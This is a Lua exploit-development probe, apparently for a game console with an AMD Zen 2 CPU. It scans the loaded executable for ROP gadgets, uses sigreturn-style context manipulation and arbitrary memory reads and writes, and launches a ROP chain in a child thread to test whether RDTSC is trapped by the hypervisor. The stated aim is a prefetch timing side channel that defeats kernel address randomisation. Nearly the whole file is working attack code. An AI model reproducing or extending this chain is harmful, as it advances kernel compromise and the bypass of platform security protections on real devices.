-- CRASH_CLASS: MODERATE
-- PROBE 146a: RDTSC + PREFETCH timing side channel for KASLR defeat
--
-- AMD Zen 2 prefetch timing: mapped pages are faster than unmapped.
-- If RDTSC works (not HV-trapped) and PREFETCH doesn't crash,
-- we can scan kernel VA range to find the kernel base.
--
-- Step 1: Find RDTSC and PREFETCH gadgets in eboot
-- Step 2: Test RDTSC in child thread (check if HV traps it)
-- Step 3: If RDTSC works, build prefetch timing loop

print("=== PROBE 146a: RDTSC PREFETCH KASLR ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC_S = 0x40
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr = make_syscall(430)
local sc_mmap = make_syscall(477)
local sc20 = make_syscall(20)
local sc_ns = make_syscall(240)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))
local eboot = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. hex(eboot))

local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC_S + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC_S + 0xA0, sc_addr)
    wq(srop_ctx + MC_S + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC_S + 0x08, a1) end
    if a2 then wq(srop_ctx + MC_S + 0x10, a2) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local g_ret = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))

print("")
print("--- [A] Search for RDTSC gadget ---")
-- RDTSC = 0F 31 (2 bytes)
-- RDTSCP = 0F 01 F9 (3 bytes)
-- Looking for: RDTSC; ...; RET pattern
-- Best: RDTSC; RET (0F 31 C3) = 3 bytes
-- Or: RDTSC; MOV [something], EAX; RET

local rdtsc_hits = {}
local rdtscp_hits = {}
local scan_size = 0x300000
local scan_step = 2

for off = 0, scan_size - 4, scan_step do
    local dw = safe_rd(uint64(string.format("0x%X%08X", ehi, elo + off)))
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    -- RDTSC; RET = 0F 31 C3
    if b0 == 0x0F and b1 == 0x31 and b2 == 0xC3 then
        rdtsc_hits[#rdtsc_hits + 1] = off
        if #rdtsc_hits <= 5 then
            print("[A] RDTSC;RET at eboot+0x" .. string.format("%X", off))
        end
    end
    -- RDTSC at byte 0 (any following)
    if b0 == 0x0F and b1 == 0x31 and #rdtsc_hits < 20 then
        -- Check if ret is nearby
        if b2 == 0xC3 or b3 == 0xC3 then
            -- already found above or rdtsc; pop; ret etc
        end
    end
    -- RDTSCP = 0F 01 F9
    if b0 == 0x0F and b1 == 0x01 and b2 == 0xF9 then
        rdtscp_hits[#rdtscp_hits + 1] = off
        if #rdtscp_hits <= 3 then
            print("[A] RDTSCP at eboot+0x" .. string.format("%X", off))
        end
    end
end
print("[A] RDTSC;RET hits: " .. #rdtsc_hits)
print("[A] RDTSCP hits: " .. #rdtscp_hits)

print("")
print("--- [B] Search for PREFETCH gadgets ---")
-- PREFETCH [RAX] = 0F 18 08 (prefetcht0 [rax])
-- PREFETCHNTA [RAX] = 0F 18 00
-- PREFETCHT0 [RDI] = 0F 18 0F
-- Looking for any prefetch near a RET

local prefetch_hits = {}
for off = 0, scan_size - 4, scan_step do
    local dw = safe_rd(uint64(string.format("0x%X%08X", ehi, elo + off)))
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    -- 0F 18 xx = prefetch family
    if b0 == 0x0F and b1 == 0x18 then
        local modrm = b2
        local mod = math.floor(modrm / 64)
        local reg = math.floor(modrm / 8) % 8
        local rm = modrm % 8
        if reg <= 3 and mod ~= 3 then
            prefetch_hits[#prefetch_hits + 1] = {off = off, modrm = b2, next_byte = b3}
            if #prefetch_hits <= 8 then
                local pftype = ({"NTA","T0","T1","T2"})[reg + 1] or "?"
                print("[B] PREFETCH" .. pftype .. " at eboot+0x" .. string.format("%X", off) ..
                    " modrm=0x" .. string.format("%02X", b2))
            end
        end
    end
end
print("[B] PREFETCH hits: " .. #prefetch_hits)

-- Also search for MOV [RDI],RAX;RET = 48 89 07 C3
print("")
print("--- [C] Search mov [rdi],rax;ret ---")
local mov_store = nil
for off = 0, scan_size - 4, scan_step do
    local dw = safe_rd(uint64(string.format("0x%X%08X", ehi, elo + off)))
    if dw == nil then break end
    if dw == 0xC3078948 then
        mov_store = off
        print("[C] mov [rdi],rax;ret at eboot+0x" .. string.format("%X", off))
        break
    end
end

-- Search for MOV [RDI],EAX;RET = 89 07 C3
if not mov_store then
    for off = 0, scan_size - 4, scan_step do
        local dw = safe_rd(uint64(string.format("0x%X%08X", ehi, elo + off)))
        if dw == nil then break end
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        if b0 == 0x89 and b1 == 0x07 and b2 == 0xC3 then
            mov_store = off
            print("[C] mov [rdi],eax;ret at eboot+0x" .. string.format("%X", off))
            break
        end
    end
end

if not mov_store then
    print("[C] No store gadget found")
end

-- Search for pop_rdx;ret = 5A C3
print("")
print("--- [D] Search pop rdx;ret ---")
local pop_rdx = nil
for off = 0, scan_size - 4, scan_step do
    local dw = safe_rd(uint64(string.format("0x%X%08X", ehi, elo + off)))
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    if b0 == 0x5A and b1 == 0xC3 then
        pop_rdx = off
        print("[D] pop rdx;ret at eboot+0x" .. string.format("%X", off))
        break
    end
end
if not pop_rdx then
    print("[D] No pop rdx;ret found")
end

-- Search for pop_rcx;ret = 59 C3
local pop_rcx = nil
for off = 0, scan_size - 4, scan_step do
    local dw = safe_rd(uint64(string.format("0x%X%08X", ehi, elo + off)))
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    if b0 == 0x59 and b1 == 0xC3 then
        pop_rcx = off
        print("[D] pop rcx;ret at eboot+0x" .. string.format("%X", off))
        break
    end
end

print("")
print("--- [E] RDTSC thread test ---")
if #rdtsc_hits > 0 and mov_store then
    local g_rdtsc = uint64(string.format("0x%X%08X", ehi, elo + rdtsc_hits[1]))
    local g_store = uint64(string.format("0x%X%08X", ehi, elo + mov_store))
    print("[E] Using RDTSC at eboot+0x" .. string.format("%X", rdtsc_hits[1]))
    print("[E] Using store at eboot+0x" .. string.format("%X", mov_store))

    -- Output area: TSC values go here
    local tsc_out = gpu + 0x50000
    for i = 0, 31, 4 do wd(tsc_out + i, 0xDEADDEAD) end

    -- Timespec
    local tspec = gpu + 0x60000
    wq(tspec, uint64(30))
    wq(tspec + 8, uint64(0))

    -- Child ROP: RDTSC → store EAX to tsc_out → nanosleep
    -- RDTSC sets EDX:EAX. RAX low 32 = TSC low, RDX = TSC high
    local ctx = gpu + 0x10000
    for off = 0, 0x4FF, 4 do wd(ctx + off, 0) end
    pcall(function() return sc_gc(uint64(ctx)) end)

    local stack = gpu + 0x20000
    for off = 0, 0xFFF, 4 do wd(stack + off, 0) end
    local rop = stack + 0xF00

    -- RDTSC; RET → RAX = TSC_lo, RDX = TSC_hi
    wq(rop + 0x00, g_rdtsc)
    -- pop_rdi → tsc_out
    wq(rop + 0x08, g_pop_rdi)
    wq(rop + 0x10, ua(tsc_out))
    -- mov [rdi], rax; ret (or eax)
    wq(rop + 0x18, g_store)
    -- Second RDTSC
    wq(rop + 0x20, g_rdtsc)
    -- pop_rdi → tsc_out+8
    wq(rop + 0x28, g_pop_rdi)
    wq(rop + 0x30, ua(tsc_out + 8))
    -- store second TSC
    wq(rop + 0x38, g_store)
    -- nanosleep to keep alive
    wq(rop + 0x40, g_pop_rdi)
    wq(rop + 0x48, ua(tspec))
    wq(rop + 0x50, g_pop_rsi)
    wq(rop + 0x58, uint64(0))
    wq(rop + 0x60, g_pop_rax)
    wq(rop + 0x68, uint64(240))
    wq(rop + 0x70, sc_addr)

    wq(ctx + 0xE0, g_ret)
    wq(ctx + 0xF8, ua(rop))

    local tid_buf = gpu + 0x40000
    wq(tid_buf, uint64(0))
    local ok_t, rv_t = pcall(function()
        return sc_thr(uint64(ctx), uint64(tid_buf), uint64(0))
    end)
    local tq = safe_rq(tid_buf)
    local th, tl = get_hi_lo(tq)
    print("[E] thr_create rv=" .. tostring(rv_t) .. " tid=" .. tl)

    -- Wait 500ms for thread to execute
    local ts_half = memory.alloc(16)
    wq(ts_half, uint64(0))
    wq(ts_half + 8, uint64(500000000))
    pcall(function() sc_ns(uint64(ts_half), uint64(0)) end)

    -- Check if thread alive
    local kill_rv = srop(433, uint64(tl), uint64(0))
    local kh, kl = get_hi_lo(kill_rv)
    print("[E] thread " .. ((kl == 0 and kh == 0) and "ALIVE" or "dead"))

    -- Read TSC values
    local tsc1 = safe_rq(tsc_out)
    local tsc2 = safe_rq(tsc_out + 8)
    print("[E] tsc1=" .. hex(tsc1))
    print("[E] tsc2=" .. hex(tsc2))

    local s1 = safe_rd(tsc_out)
    local s2 = safe_rd(tsc_out + 4)
    print("[E] raw: +" .. string.format("0x%X", s1 or 0) .. " +" .. string.format("0x%X", s2 or 0))

    if s1 ~= nil and s1 ~= 0xDEADDEAD then
        print("[E] *** RDTSC WORKS! TSC values written ***")
        if tsc1 and tsc2 then
            local t1h, t1l = get_hi_lo(tsc1)
            local t2h, t2l = get_hi_lo(tsc2)
            if t2l > t1l or t2h > t1h then
                local delta = t2l - t1l
                print("[E] TSC delta between two reads: " .. delta .. " cycles")
            end
        end
    elseif s1 == 0xDEADDEAD then
        print("[E] Sentinel intact — RDTSC may have crashed thread (HV trap?)")
    else
        print("[E] Read failed — thread may have crashed")
    end
else
    if #rdtsc_hits == 0 then
        print("[E] SKIP: no RDTSC gadget found")
    end
    if not mov_store then
        print("[E] SKIP: no store gadget found")
    end
end

print("")
print("=== PROBE 146a COMPLETE ===")
